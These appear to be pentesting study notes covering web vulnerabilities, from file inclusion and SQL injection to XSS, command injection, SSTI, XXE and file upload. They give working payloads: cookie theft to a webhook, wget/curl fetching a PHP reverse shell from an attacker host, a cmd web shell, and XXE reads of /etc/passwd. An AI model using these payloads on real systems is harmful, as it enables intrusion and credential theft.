
**Link to Extra Notes:**
[[Web Application Vulnerabilities Exploitation]]

## File Inclusion:

OWASP - LFI: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion

OWASP - RFI: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion

HackTricks: https://book.hacktricks.xyz/pentesting-web/file-inclusion

PayloadsAllTheThings:[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

##### **File Inclusion:**

- To use these separate modules, a main application file includes or imports them as needed.
- In web applications, this is often done using directives like include, require in PHP, import in Python, or require in Node.js
- This inclusion mechanism allows for reusing code, such as libraries, configurations, templates, or other functional modules.
- Many applications dynamically include files based on user input or other variables.
- This is done to load resources specific to a user's request, like different language files, user-specific configurations, or templates

- **Improper validation of user input:**
		- When the path of the included file is constructed using user input without proper validation or sanitization, an attacker can manipulate this path.
		- This manipulation can lead to including files that were not intended to be accessible.
- **Lack of Proper Access Controls:**
		- Applications that do not implement robust access controls on file directories and resources are more susceptible to these vulnerabilities.
		- This lack of control can allow unauthorized access to sensitive files.
- **Local File Inclusion (LFI):**
		- In LFI attackers exploit this vulnerability to include files that are already present on the server, such as configuration files, logs or even executable code.
		- This can lead to information disclosure, server-side code execution or privilege escalation.
- **Remote File Inclusion (RFI):**
		- RFI occurs when an application allows the inclusion of remote files through URLs
		- If not properly secured, an attacker can include a remote file (like a malicious script hosted on their server) into the application.
- **Directory/Path Traversal:**
		- Path Traversal is a vulnerability that occurs when web applications allow input to influence the path used to access resources.
		- By manipulating variables that reference files (like ../ in Unix-based systems or ..\ in Windows), we can move up directories and access files or directories that should not be accessible through the web application.
		- **Absolute path:**
			- `/path/to/file.txt`
		- **Relative path:**
			- `/var/www/html/../../../etc/passwd`
-  **Common Parameters:**
		- Any parameter can be potentially vulnerable to File inclusion however, it's often worth paying particular attention to common parameters and the behavior of an application when hunting for vulnerabilities.
		- Over time you will become more attuned to suspicious application behavior.
		- ( #Resources ): [https://twitter.com/trbughunters/status/1279768631845494787](https://twitter.com/trbughunters/status/1279768631845494787 

- **Insufficient Filtering:**
		- Some filters are weak:
			- Not applied recursively
			- Blocklist without all necessary characters
			- Not using an Allowlist
			- Not configured to handle encoded payloads
			- Weakly configured permissions
- **Filter Bypasses:**
	- **PHP Wrappers:**
			- Wrappers are a part of PHP's stream handling system. They provide a way to access data regardless of its source or the protocol used to retrieve it. Essentially, they "wrap" different data sources into a uniform interface.
	- **Other protocols:**
			- File system (file://): The default wrapper used to access the local file system
			- HTTP (http://, https://): For accessing data via HTTP or HTTPS protocols
			- FTP (ftp://, ftps://): To interact with files over ftp or ftps.
			- PHP (php://): A special wrapper that allows access to various I/O streams, such as php://input for raw input data from a request or php://output for capturing output.
- **File Inclusion to RCE:**
	- Ways to Achieve RCE:
		- Log file poisoning
		- Email inclusion
		- Via `/proc/*/fd/*`
		- Via /proc/self/environ
		- Via upload
		- Via PHP sessions
		- Via SSH
		- Via PHP filters
- **Prevention:**
		- Avoid passing user input into paths and file names
		- Validate the input with an allow list
		- Use a pre-defined base path
		- Properly configured permissions and access controls


## SQL Injection:


- **SQL Injection:**
	- This allows us to manipulate queries that are made to a database and typically leads to:
		- Exposure of sensitive data
		- Data manipulation
		- Denial of Service

- Useful commands to check if SQL injection is possible:

- Inside user search:
	- Try ", ' and a username with quote at the start and end to see if this breaks the application, and outputs a stack trace error, from mysql
	- `jeremy' or 1=1#`
		- (#) is for terminator or we can also use (-- -) as a terminator for the mysql
		- This will grab all the data in the table
	- `jeremy' union select null#`
		- Using union and null, we can find how many columns are selected in the select statement, if you dont see the result with 1 null, try 2 or 3 and see when we will get the results.
	- `jeremy' union select null,null,null#`
		- Union will only output, if only the number of columns matches with the first select query, we can use this to grab tables information  in the database.
	- `jeremy' union select null, null,table_name from information_schema.tables#`

- Useful resource:
	- https://portswigger.net/web-security/sql-injection/cheat-sheet

- **SQL Map:**

- SQL Map can be used to check the SQL injection with the payload, we have try to copy and payload and save it in a file and use the command:
	-  `sqlmap -r {filename.txt}`
		- This will run the blind SQL tests and see if we have any SQL injections possible
	- `sqlmap -r {filename2.txt} --dump` 
		- This can be used to dump the details found from the tables, if it finds there is a SQL injection possibility
	- `sqlmap -r {filename2.txt} --dump -T {table_name}`
		- If we know the table name, we can dump the details from only that table

- **Blind SQL Injection:**
	- [https://www.db-fiddle.com/f/nLpyQDMd49iRygnY9H7CB8/5](https://www.db-fiddle.com/f/nLpyQDMd49iRygnY9H7CB8/5) ( #Resources )
	
- **Tools vs Custom Scripts for Blind SQLi**
	- Tools tend to lead to a faster workflow
	- Scripts can be more precise or customizable
	- Scripts can help you develop your skills and understanding of an attack
	- There are not many cases that warrant custom scripts

- **NoSQL:**
	- NoSQL databases are designed to store, retrieve and manage large volumes of data that do not fit well in traditional relational databases. They are known for their flexibility, scalability, and high performance.
		- **Types of NoSQL Databases**: Document stores (MongoDB), key-value stores (Redis), Wide-column stores (Cassandra), and Graph databases (Neo4j)
		- **Flexibility:** NoSQL databases do not require a fixed schema, allowing the structure of the data to change over time.
		- **Scalability**: Designed to scale out by using distributed architectures, making them suitable for cloud-based applications
		- **Use cases:** Big data applications, real-time web apps IoT devices and more
	- `{"username":{"$regex":"admin.*"},"password":{"$ne":""}}`


## Cross-Site Scripting (XSS):

- Port Swigger XSS cheat sheet:
	- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

- **What is XSS (Cross site scripting):**

	- XSS allows us to execute code in the client/browser which can potentially lead to:
		- Impersonate a user & carry out actions on their behalf
		- Steal data (including user input)
	
- **Types of XSS:**

	- **Reflected XSS:**
		- The script is reflected off a web server and is immediately executed when a user clicks on a malicious link. It is not stored on the server.
		
	- **Stored XSS:**
		- The malicious script is stored on the server (e.g., in a database) and is served to users who access the affected page.
		- `<script>var i = new Image; i.src="webhookurl/?"+document.cookie;</script>`
		- This is useful to steal the cookie and send it to the web server that is listening
		
	- **DOM based:**
		- The vulnerability exists in the client-side code (JavaScript) where the script modifies the DOM without proper sanitization, allowing attackers to execute malicious code.
			- Example:
				- `<img src = x onerror = "prompt(1)">`

- Depending on the application XSS can appear in different contexts. Identifying this context is going to be key to our approach.
	- When testing for XSS we need to identify two things:
		- Where our payload appears in the response
		- What input validation exists

- **Offensive JavaScript for API:**

	- Building requests:
		- XMLHTTP request:
			- `let xhr = new XMLHttpRequest()`
			- `xhr.open('GET', 'http://localhost/endpoint',true)`
			- `xhr.send('email=update@email.com')`
		- Fetch API:
		- `fetch('http://localhost/endpoint')`
	- Stealing cookies:
		- `<img src="http://localhost?c='+document.cookie+'"`
		- `fetch("http://localhost?c="+documnet.cookie);`
	- Accessing local & session storage:
		- `let localStorageData = JSON.stringify(localStorage)`
		- `let sessionStorageData = JSON.stringify(sessionStorage)`
	- Saved creds:
		- `// create the input elements`
		- `let usernameField = document.createElement("input")`
		- `usernameField.type = "text"`
		- `usernameField.name = "username"`
		- `usernameField.id = "username"   `
		- `let passwordField = document.createElement("input")`
		- `passwordField.type = "password"`
		- `passwordField.name = "password"`
		- `passwordField.id = "password"   `
		- `// append the elements to the body of the page`
		- `document.body.appendChild(usernameField)`
		- `document.body.appendChild(passwordField)   `
		- `// exfiltrate as needed (we need to wait for the fields to be filled before exfiltrating the information)`
		- `setTimeout(function() {`
			- `console.log("Username:", document.getElementById("username").value)``console.log("Password:", document.getElementById("password").value)``}, 1000);`  
		
	- Session riding :
		- `let xhr = new XMLHttpRequest();`
			- `xhr.open('POST','http://localhost/updateprofile',true);`
			- `xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');`
			- `xhr.send('email=[updated@email.com](mailto:updated@email.com)’);`  
	
	- Keylogging : 
		- `document.onkeypress = function(e) {`
		- `get = window.event ? event : e`
		- `key = get.keyCode ? get.keyCode : get.charCode`
		- `key = String.fromCharCode(key)`
		- `console.log(key)`
		- `}`

- **Bypasses and Obfuscation:**

	- Application filtering /  input validation:
		- Applications often filter input to weed out XSS and other payloads. However, we can use different techniques to obfuscate our payloads or find different payloads that can pass undetected.
	- Escaping:
		- Escaping is a technique used to secure output by ensuring that any special characters are treated as literal text, not as part of an executable code snippet.
		- Payload:
			- `<script>prompt()</script>`
		- Escaped:
			- `&lt;script&gt;prompt()&lt;/script&gt;`
	- WAF bypass techniques:
		- Web Application Firewalls (WAFs) are security solutions designed to protect web applications by filtering and monitoring HTTP traffic between a web application and the internet. They operate according to a set of rules and policies that define benign and malicious web traffic.
		- WAF bypasses are techniques that exploit the logic flaws or gaps in the WAF's detection mechanisms. Since WAFs are often rule-based systems, they can be susceptible to evasion if the malicious payload does not match any of their known attack signatures, or if it is obfuscated in  a way that the WAF fails to detect.
		- Obfuscation:
			- Making the attacks appear as normal traffic by using encoding, case changes, whitespace insertion, or other methods that do not match the WAF's signature patterns.
		- Evasion:
			- Altering the syntax of the attack to evade detection without changing the semantics of the attack payload
		- Blending:
			- Mixing normal and attack traffic in a way that confuses the WAF and makes it harder to distinguish between the two.
		- Parameter Pollution:
			- Sometimes WAFs and applications handle HTTP requests differently, and we can use this to sneak payloads past a WAF and into the application.
			- `GET /?param=value&param=value`
			- `GET /?param=<script>prompt()</script>&param=1`
			- `GET /?param=1&param=<script>prompt()</script>`
		- Encoding:
			- We can encode payloads to bypass the WAFs that don't decode recursively or in proper order.


## Command Injection:

- Command injection is a type of security vulnerability that occurs when an attacker is able to execute arbitrary commands on a host operating system via a vulnerable application. This typically happens when an application takes untrusted input and passes it to a system shell or command interpreter without proper validation or sanitization.

 **How it Works:**

1. **Input Exploitation**: An attacker manipulates input fields (like forms or URLs) to inject malicious commands.
2. **Execution**: The application executes the injected command with the same privileges as the application, potentially allowing the attacker to gain unauthorized access to the system.

**Consequences:**

- Data theft or modification
- System takeover
- Installation of malware
- Denial of service

**Prevention:**

- Validate and sanitize user inputs.
- Use parameterized queries and prepared statements.
- Employ least privilege principles for application permissions.
- Use security tools to monitor and detect suspicious activities.

#### Blind Command Injection:

In case, we are not able to see the output and not sure if the command is being executed, we can use web hook or have any server to listen and type the command to test,  if the blind command injection is working:
- {webhook_url}?\`whoami\`

We can also use \n to go to next line and execute a command, for example, we are going to grab a file from the python http server, we host in the attacker machine

- `https://google.com \n wget {attacker_IP_address}:81/test`
- In attacker machine, we will have `python3 -m http.server 81`

If we need to pop the shell from the target machine, with blind command injection, we can upload the shell script from attacker machine and listen to that port, to trigger a reverse shell. This is because as the ; and other required characters, are being filter in the search functionality in blind injection.

Grab the php revese shell from the below path:
- `/usr/share/webshells/laundanum/php/php-reverse-shell.php`

Copy it to any location, where you can host the web server with python
- `cp /usr/share/webshells/laundanum/php/php-reverse-shell.php ./tmp`

Gedit the file and update the ip_address and port as required and rename the filename as required to smaller form factor
-  `mv php-reverse-shell.php rev.php`
- `gedit rev..php`

Host the python web server in tmp folder
- `python3 -m http.server 81`

In another command tab, listen for the port mentioned in the reverse shell file
- `nc -nvlp 4444`

In the browser, for blind injection use wget and grab the php file or if that doesn't work we can use curl to grab the file.
- `https://google.com \n wget {attacker_IP_address}:81/rev.php`
- `https://google.com && curl {attacker_IP_address}:81/rev.php > /var/www/html/rev.php`

Once, we have the file in the target machine try to run the file, that is placed in /var/www/html path, with the base url, for example
-  `http://localhost/rev.php`

Observe if the reverse shell is popped in the nc listen in attacker machine, if yes, we are successful with the blind command injection.


## Server-Side Template Injection (SSTI):


**Server-Side Template Injection (SSTI)** is a security vulnerability that occurs when user input is improperly handled and then embedded into a template on the server side, leading to the execution of unintended code. It exploits a web application that uses server-side templating engines (such as Jinja2, Django Templates, or Twig) to generate dynamic content by injecting malicious template code through user input. If the input is not adequately sanitized or validated, it can lead to the execution of arbitrary code on the server.

##### How Server-Side Template Injection Works:

1. **Template Engine Use**: Many web applications use server-side templating engines to generate dynamic content. These engines process templates (HTML, XML, etc.) and fill in dynamic data, such as user-provided input, from the backend.

2. **Injection of Template Code**: If an attacker can control or influence the template code being processed, they may inject template syntax or expressions into the input fields. For example, in a Python application using Jinja2, an attacker could inject something like `{{ config }}`, `{{ 7*7 }}`, or `{{ request.args.get('user_input') }}` into an input field.

3. **Execution of Arbitrary Code**: The server-side template engine processes the injected code, which could result in:
    
    - **Information Disclosure**: The attacker may be able to access sensitive information, such as environment variables or system configuration settings, by manipulating template expressions (e.g., `{{ config }}`).
    - **Remote Code Execution (RCE)**: In more severe cases, the attacker could execute arbitrary code on the server by manipulating the template engine's behavior (e.g., using `os.system()` in Python or accessing system functions).
    - **Data Exfiltration**: Attackers may extract data from the server, including files or database contents.

##### Example of Server-Side Template Injection:

Imagine a web application that uses a templating engine like Jinja2 to render user-specific pages. The server might render a page with the following template:

HTML:

`<h1>Welcome, {{ username }}!</h1>`

If an attacker can influence the `username` value (e.g., through a query parameter or form input), they might inject something malicious like:

`{{ config.items() }}  # In a Jinja2-based app, this could list all the items in the 'config' object.`

If the server processes this input, it could reveal sensitive internal data to the attacker, such as server configurations or database connection strings.

##### Common Templating Engines That Are Vulnerable:

- **Jinja2** (Python)
- **Django Templates** (Python)
- **Twig** (PHP)
- **Velocity** (Java)
- **Freemarker** (Java)

##### Prevention:

To prevent SSTI, it's crucial to follow secure coding practices, such as:

1. **Input Validation and Sanitization**: Properly validate and sanitize user input before it's included in any template.

    - Reject any characters or sequences that could be interpreted as template code (e.g., `{{`, `}}`, `{%`, `%}`).

2. **Use Contextual Output Encoding**: When including user input in templates, ensure the content is safely encoded to prevent unintended execution.

3. **Limit Template Engine Functionality**: Configure the template engine to disable or limit the ability to execute arbitrary code, such as disabling access to Python’s `eval()` or `os` module in Jinja2 or other engines.

4. **Secure the Template Context**: Avoid passing dangerous objects, like sensitive data or user-controlled variables, into the template context.

5. **Use Whitelisting Instead of Blacklisting**: Rather than blacklisting dangerous characters or templates, a more robust approach is to use a strict whitelist of allowed inputs and operations.


## XML External Entity (XXE):


XXE, or XML External Entity, is a type of security vulnerability that occurs in XML parsers. It allows an attacker to interfere with the processing of XML data by including malicious external entities. This can lead to various issues, such as:

1. **Data Disclosure**: An attacker can extract sensitive information from the server's file system.
2. **Denial of Service (DoS)**: By referencing large files or entities, the server may be overloaded.
3. **Server-side Request Forgery (SSRF)**: An attacker can make the server send requests to internal or external systems.

To mitigate XXE vulnerabilities, developers should:

- Disable external entity processing in XML parsers.
- Use safer data formats like JSON when possible.
- Validate and sanitize XML input.

Example:
`<?xml version="1.0" encoding="UTF-8"?>`
`<!DOCTYPE creds [`
`<!ELEMENT creds ANY >`
`<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>`
`<creds><user>&xxe;</user><password><pass></password></creds>`

XML uses a tree-like structure
- There are no pre-defined tags
- Declining in popularity

**DTD (Document Type Definition):**

- Contains declarations that can defile the structure of an XML document and types of values it can contain
- Can be fully self-contained or loaded externally ("External DTD"), or a mixture of the two.
- Defined using the 'DOCTYPE' keyword.

**XML custom entities:**

- Entities defined in the DTD
- `<!DOCTYPE ase [<!ENTITTY cheese "gouda"]>`
- `&cheese;` in the XML document will be replaced with gouda.

**XML external entities:**

- External entities are also defined in the DTD and use the SYSTEM keyword.
- `<!DOCTYPE ase [!<ENTITY cheese SYSTEM "http://gouda.com/gouda"]>`	
- We can also use the file:// and other protocol instead of http.

**Payloads:**
- XML external entities:
	- `<!DOCTYPE ase [<!ENTITY cheese SYSTEM "http://gouda.com/gouda">]>`
	- `<customtag>&cheese:</customtag>`
	- `<!DOCTYPE ase [<!ENTITY cheese SYSTEM "ftp:///etc/passwd">]>`
	- `<customtag>&cheese:</customtag>`
	
 **XML parameter entities:**
- `<!DOCTYPE ase [<!ENTITY % cheese SYSTEM "http://gouda.com/gouda"> %cheese; ]>`
	
**Listing files via XXE:**
- Listing /
	- `<?xml verson="1.0" encoding="UTF-8"?>`
	- `<!DOCTYPE ase [<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]>`
	- `<root><foo>&xxe;</foo></root>`
- Listing /etc
	- `<?xml verson="1.0" encoding="UTF-8"?>`
	- `<!DOCTYPE ase [<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///etc/">]>`
	- `<root><foo>&xxe;</foo></root>`
	
**XXE via File Upload:**
- We can sometimes achieve XXE with XML-based file formats.
	- SVG
	- DOCX
- Even when a target application asks for non-XML files such as a PNG, it might accept a SVG and be vulnerable to XXE.
- To achieve this we usually need to ensure that the Content-Type is set to 'text/xml'.
	- `POST /action HTTP/1.0`
	- `Content-Type: text/xml`
	- `<?xml version="1.0" encoding="UTF-8"?>`
	- `<!DOCTYPE ase [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
	- `<ase>&xxe;</ase>`
	
**XXE via XInclude:**
- Payload:
	- `<foo xmlns:xi="http://www.w3.org/2001/xInclude">`
	- `xi:include parse="text" href="file:///etc/passwd"/>`
	- `</foo>`
	
**Using XXE to achieve SSRF:**
	- SSRF:
	- A vulnerability that allows us to induce the server-side application to make requests on our behalf.
	- For example, we might want to reach an internal endpoint that we don't have access to, but the application we are attacking can make the request instead.


## Insecure File Upload:

**Insecure File Upload - Basic Bypass:**

Through this vulnerability, we can upload a file with malicious code and execute it remotely, to get a shell or any other command.

- We can use php command, {<?php system($_GET['cmd']); ?> } to provide parameters to the php file, with cmd = and the system will execute it
- After the file is uploaded, we can find the path, were it is stored and run the php file and provide the value for the parameter cmd:
	- `http://localhost/labs/uploads/cmd.php?cmd=whoami`
	
 **Insecure File Upload - Magic Bytes:**
 
- https://www.thehacker.recipes/web/inputs/null-byte-injection (null byte attack)

- We can check the magic bytes of a file, using the command:
	- `file logo.png` or `head logo.png`
- In this attack, we keep the starting magic bytes of an png file and attach the php script for example:
	- PNG .....magic bytes data {<?php system($_GET['cmd']); ?>}
	- As the application is checking with the magic bytes to determine the file type, we will be using this technic to bypass the upload check, and uploading as a php file
- If the checks is being done using the file extension we provide in the filename, we can use the null byte attack to skip the extension
	- `malicious.php%00.pdf`
- We can use other php extensions, if the application is blocking only php, rather than only allowing jpg and png, we can google 'vaild php file extensions' and use of that and see if the upload still works

